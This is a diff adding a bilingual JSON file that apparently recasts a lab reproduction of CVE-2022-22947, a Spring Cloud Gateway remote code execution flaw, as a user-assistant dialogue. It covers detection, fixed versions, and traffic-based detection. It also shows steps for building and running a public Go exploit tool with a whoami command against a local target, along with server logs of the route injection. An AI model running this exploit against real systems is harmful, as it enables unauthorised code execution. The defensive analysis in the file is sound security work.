@@ -1,0 +1,122 @@
+{
+    "_source_md":  "spring/spring_cloud/2022-03-15-CVE-2022-22947-Spring-Cloud-Gateway-RCE.md",
+    "version":  "cve-2022-22947-spring-cloud-gateway",
+    "title":  {
+                  "zh":  "CVE-2022-22947：Spring Cloud Gateway 远程代码执行漏洞",
+                  "en":  "CVE-2022-22947: Spring Cloud Gateway Remote Code Execution Vulnerability"
+              },
+    "description":  {
+                        "zh":  "Spring Cloud Gateway 远程代码执行漏洞 CVE-2022-22947 的复现分析，包括漏洞利用工具使用、攻击原理和检测思路。",
+                        "en":  "Reproduction analysis of Spring Cloud Gateway remote code execution vulnerability CVE-2022-22947, including exploitation tool usage, attack principles and detection approaches."
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "分析 CVE-2022-22947 Spring Cloud Gateway RCE 漏洞",
+                                      "en":  "Analyze CVE-2022-22947 Spring Cloud Gateway RCE vulnerability"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户请求分析 Spring Cloud Gateway 漏洞",
+                                         "en":  "User requests analysis of Spring Cloud Gateway vulnerability"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "java -jar spring-gateway-demo-0.0.1-SNAPSHOT.jar --debug\n\n  .   ____          _            __ _ _\n /\\\\ / ___\u0027_ __ _ _(_)_ __  __ _ \\ \\ \\ \\\n( ( )\\___ | \u0027_ | \u0027_| | \u0027_ \\/ _` | \\ \\ \\ \\\n \\\\/  ___)| |_)| | | | | || (_| |  ) ) ) )\n  \u0027  |____| .__|_| |_|_| |_\\__, | / / / /\n =========|_|==============|___/=/_/_/_/\n :: Spring Boot ::       (v2.6.3-SNAPSHOT)\n \n Netty started on port 9000",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "$ curl http://localhost:9000/actuator\n\n{\"_links\":{\"self\":{\"href\":\"http://localhost:9000/actuator\",\"templated\":false},\"gateway\":{\"href\":\"http://localhost:9000/actuator/gateway\",\"templated\":false}}}",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "$ git remote -v\norigin\thttps://github.com/tangxiaofeng7/CVE-2022-22947-Spring-Cloud-Gateway.git (fetch)\norigin\thttps://github.com/tangxiaofeng7/CVE-2022-22947-Spring-Cloud-Gateway.git (push)",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "$ go build main.go\ngo: downloading github.com/panjf2000/ants/v2 v2.4.8\ngo: downloading github.com/go-resty/resty/v2 v2.7.0\ngo: downloading golang.org/x/net v0.0.0-20211029224645-99673261e6eb\n\n$ ./main -u http://127.0.0.1:9000 -c whoami\nhttp://127.0.0.1:9000  \u0027bin4xin\\n\u0027",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "2022-03-15 10:22:26.711 DEBUG 11029 --- [ctor-http-nio-2] o.s.w.s.adapter.HttpWebHandlerAdapter    : [68b629bb-1] HTTP POST \"/actuator/gateway/routes/LZQXX\"\n[ctor-http-nio-2] a.e.w.r.ControllerEndpointHandlerMapping : [68b629bb-1] Mapped to org.springframework.cloud.gateway.actuate.GatewayControllerEndpoint#save(String, RouteDefinition)\n[ctor-http-nio-2] .r.m.a.RequestBodyMethodArgumentResolver : [68b629bb-1] Content-Type:application/json\n[ctor-http-nio-2] .r.m.a.RequestBodyMethodArgumentResolver : [68b629bb-1] 0..1 [org.springframework.cloud.gateway.route.RouteDefinition]\n[ctor-http-nio-2] o.s.http.codec.json.Jackson2JsonDecoder  : [68b629bb-1] Decoded [RouteDefinition{id=\u0027LZQXX\u0027, predicates=[], filters=[FilterDefinition{name=\u0027AddResponseHeader\u0027, args= (truncated)...]\n[ctor-http-nio-2] o.s.w.s.adapter.HttpWebHandlerAdapter    : [68b629bb-1] Completed 201 CREATED\n[ctor-http-nio-3] o.s.w.s.adapter.HttpWebHandlerAdapter    : [36032421-2] HTTP POST \"/actuator/gateway/refresh\"\n[ctor-http-nio-3] a.e.w.r.ControllerEndpointHandlerMapping : [36032421-2] Mapped to org.springframework.cloud.gateway.actuate.GatewayControllerEndpoint#refresh()\n[ctor-http-nio-3] o.s.w.s.adapter.HttpWebHandlerAdapter    : [36032421-2] Completed 200 OK\n[ctor-http-nio-4] o.s.w.s.adapter.HttpWebHandlerAdapter    : [9763438e-3] HTTP GET \"/actuator/gateway/routes/LZQXX\"\n[ctor-http-nio-4] a.e.w.r.ControllerEndpointHandlerMapping : [9763438e-3] Mapped to org.springframework.cloud.gateway.actuate.GatewayControllerEndpoint#route(String)\n[ctor-http-nio-4] .s.w.r.r.m.a.ResponseEntityResultHandler : [9763438e-3] Using \u0027application/json\u0027 given [*/*] and supported [application/json, application/*+json, application/x-ndjson, text/event-stream]\n[ctor-http-nio-4] .s.w.r.r.m.a.ResponseEntityResultHandler : [9763438e-3] 0..1 [java.util.Map\u003cjava.lang.String, java.lang.Object\u003e]\n[ctor-http-nio-4] o.s.http.codec.json.Jackson2JsonEncoder  : [9763438e-3] Encoding [{predicate=RouteDefinitionRouteLocator$$Lambda$918/2002125647, route_id=LZQXX, filters=[[[AddRespons (truncated)...]\n[ctor-http-nio-4] o.s.w.s.adapter.HttpWebHandlerAdapter    : [9763438e-3] Completed 200 OK\n[ctor-http-nio-5] o.s.w.s.adapter.HttpWebHandlerAdapter    : [1f92a2eb-4] HTTP DELETE \"/actuator/gateway/routes/LZQXX\"\n[ctor-http-nio-5] a.e.w.r.ControllerEndpointHandlerMapping : [1f92a2eb-4] Mapped to org.springframework.cloud.gateway.actuate.GatewayControllerEndpoint#delete(String)\n[ctor-http-nio-5] o.s.w.s.adapter.HttpWebHandlerAdapter    : [1f92a2eb-4] Completed 200 OK\n[ctor-http-nio-5] o.s.w.s.adapter.HttpWebHandlerAdapter    : [1f92a2eb-5] HTTP POST \"/actuator/gateway/refresh\"\n[ctor-http-nio-5] a.e.w.r.ControllerEndpointHandlerMapping : [1f92a2eb-5] Mapped to org.springframework.cloud.gateway.actuate.GatewayControllerEndpoint#refresh()\n[ctor-http-nio-5] o.s.w.s.adapter.HttpWebHandlerAdapter    : [1f92a2eb-5] Completed 200 OK",
+                                             "language":  "console"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "漏洞概述：Spring Cloud Gateway 3.1.0、3.0.0-3.0.6 及旧的不受支持版本存在远程代码执行漏洞。漏洞利用通过 actuator gateway API 注入恶意路由，通过 Spring Expression Language (SpEL) 实现代码执行。靶场启动：java -jar spring-gateway-demo-0.0.1-SNAPSHOT.jar --debug，服务监听 9000 端口。",
+                                      "en":  "Vulnerability overview: Spring Cloud Gateway 3.1.0, 3.0.0-3.0.6 and older unsupported versions have remote code execution vulnerability. Exploitation works by injecting malicious routes through actuator gateway API, achieving code execution via Spring Expression Language (SpEL). Target setup: java -jar spring-gateway-demo-0.0.1-SNAPSHOT.jar --debug, service listens on port 9000."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "如何识别目标是否存在该漏洞？",
+                                      "en":  "How to identify if target has this vulnerability?"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户执行操作",
+                                         "en":  "用户执行操作"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "识别方法：1) 访问 /actuator 端点，查看返回的 _links 中是否包含 gateway 字段；2) curl http://localhost:9000/actuator 返回 gateway 路由链接即可确认目标使用 Spring Cloud Gateway。修复方案：3.1.x 升级到 3.1.1+，3.0.x 升级到 3.0.7+，或设置 management.endpoint.gateway.enabled 为 false。",
+                                      "en":  "Identification method: 1) Access /actuator endpoint, check if returned _links contain gateway field; 2) curl http://localhost:9000/actuator returns gateway route link confirms target uses Spring Cloud Gateway. Fix: 3.1.x upgrade to 3.1.1+, 3.0.x upgrade to 3.0.7+, or set management.endpoint.gateway.enabled to false."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "漏洞利用的 EXP 如何使用？",
+                                      "en":  "How to use the vulnerability EXP?"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户执行操作",
+                                         "en":  "用户执行操作"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "EXP 使用方法：1) 使用 Go 编写的漏洞利用工具：go build main.go；2) 执行攻击：./main -u http://127.0.0.1:9000 -c whoami，成功返回当前用户。检测思路：通过分析 HTTP 流量，检测是否存在异常访问 actuator gateway API 的请求，关注 POST /actuator/gateway/routes 和 POST /actuator/gateway/refresh 请求。",
+                                      "en":  "EXP usage: 1) Use Go-based exploitation tool: go build main.go; 2) Execute attack: ./main -u http://127.0.0.1:9000 -c whoami, successfully returns current user. Detection approach: Analyze HTTP traffic to detect abnormal access to actuator gateway API, focus on POST /actuator/gateway/routes and POST /actuator/gateway/refresh requests."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  }
+              ]
+}
